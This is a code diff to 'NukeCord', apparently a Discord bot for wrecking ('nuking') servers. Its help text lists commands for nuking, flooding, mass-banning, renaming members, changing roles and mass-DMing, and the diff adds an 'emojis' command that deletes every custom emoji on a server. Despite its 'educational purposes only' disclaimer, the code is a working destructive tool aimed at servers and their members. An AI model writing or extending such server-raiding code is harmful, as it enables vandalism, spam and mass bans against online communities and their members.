@@ -1,4 +1,4 @@
-import discord 
+import discord
 from discord.ext import commands
 import json, os
 from colorama import Fore as color
@@ -55,7 +55,7 @@ async def on_command_error(ctx, error):
 @bot.command()
 async def help(ctx):
     if ctx.author.id == ID:
-        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!alert <text>\nnc!flood <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\n```", color=0x36393e)
+        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!alert <text>\nnc!flood <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\nnc!emojis\n```", color=0x36393e)
         embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
         await ctx.send(embed=embed)
 
@@ -166,6 +166,27 @@ async def dm(ctx, *, arg):
             except:
                 print(color.RED + f"[!] Failed to DM {member}")
         await msg.add_reaction("✅")
+
+        
+        
+        
+@bot.command()
+@commands.guild_only()
+async def emojis(ctx, *, arg):
+    if ctx.author.id == ID:
+        msg = ctx.message
+        await msg.add_reaction("🔄")
+        for emoji in ctx.guild.emojis:
+            try:
+                await emoji.delete()
+            except:
+                print(color.RED + f"[!] Failed deleting emoji {emoji.name}")
+        await msg.add_reaction("✅")
+    else:
+        return        
+        
+        
+        
         
 
 bot.run(TOKEN)
